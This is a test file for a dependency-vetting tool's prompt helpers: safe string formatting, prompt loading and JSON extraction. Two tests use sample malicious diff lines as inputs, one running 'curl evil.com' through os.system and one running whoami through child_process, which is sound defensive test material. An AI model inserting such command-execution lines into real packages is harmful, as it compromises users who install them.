"""Tests for depvet.analyzer.prompt_util — safe prompt formatting."""

from __future__ import annotations

import json

import pytest

from depvet.analyzer.prompt_util import extract_json, load_prompt, safe_format


class TestSafeFormat:
    def test_replaces_known_vars(self):
        result = safe_format("Hello {name} v{version}", name="pkg", version="1.0")
        assert result == "Hello pkg v1.0"

    def test_leaves_unknown_braces_intact(self):
        result = safe_format('{"example": {unknown}} {name}', name="test")
        assert "{unknown}" in result
        assert "test" in result

    def test_json_examples_in_prompt_preserved(self):
        """JSON examples like `{k}={v}` in prompts must not cause KeyError."""
        template = 'Format: {k}={v} for k,v in items. Package: {package_name}'
        result = safe_format(template, package_name="requests")
        assert "{k}" in result
        assert "{v}" in result
        assert "requests" in result

    def test_empty_kwargs_returns_template(self):
        template = "No vars {here}"
        assert safe_format(template) == template

    def test_curly_braces_in_diff_content(self):
        """Diff content with JS objects should not break formatting."""
        template = "Diff:\n{diff_chunk}\nEnd."
        diff = "+const obj = {foo: 'bar', baz: {nested: true}};"
        result = safe_format(template, diff_chunk=diff)
        assert diff in result


class TestLoadPrompt:
    def test_loads_triage_prompt(self):
        text = load_prompt("triage.txt")
        assert len(text) > 100
        assert "{package_name}" in text

    def test_loads_deep_analysis_prompt(self):
        text = load_prompt("deep_analysis.txt")
        assert len(text) > 100
        assert "{diff_chunk}" in text

    def test_loads_deep_analysis_npm_prompt(self):
        text = load_prompt("deep_analysis_npm.txt")
        assert len(text) > 100
        assert "{diff_chunk}" in text


class TestDeepAnalysisPromptSafeFormat:
    """Verify that real prompt templates can be formatted without error."""

    def test_deep_analysis_format_does_not_crash(self):
        template = load_prompt("deep_analysis.txt")
        result = safe_format(
            template,
            chunk_index=1,
            total_chunks=1,
            ecosystem="pypi",
            package_name="evil-pkg",
            old_version="1.0.0",
            new_version="1.0.1",
            diff_chunk="+import os\n+os.system('curl evil.com')\n",
            pre_analysis_context="",
        )
        assert "evil-pkg" in result
        assert "1.0.1" in result
        # Original JSON examples should survive
        assert "{" in result  # JSON examples still present

    def test_deep_analysis_npm_format_does_not_crash(self):
        template = load_prompt("deep_analysis_npm.txt")
        result = safe_format(
            template,
            chunk_index=1,
            total_chunks=1,
            ecosystem="npm",
            package_name="lodash",
            old_version="4.17.20",
            new_version="4.17.21",
            diff_chunk="+require('child_process').exec('whoami')\n",
            pre_analysis_context="",
        )
        assert "lodash" in result

    def test_triage_format_does_not_crash(self):
        template = load_prompt("triage.txt")
        result = safe_format(
            template,
            package_name="requests",
            old_version="2.31.0",
            new_version="2.32.0",
            diff_chunk="+import base64\n",
        )
        assert "requests" in result


class TestExtractJson:
    def test_plain_json(self):
        assert extract_json('{"verdict": "BENIGN"}') == {"verdict": "BENIGN"}

    def test_markdown_block(self):
        assert extract_json('```json\n{"k": 1}\n```') == {"k": 1}

    def test_invalid_raises(self):
        with pytest.raises(json.JSONDecodeError):
            extract_json("not json")
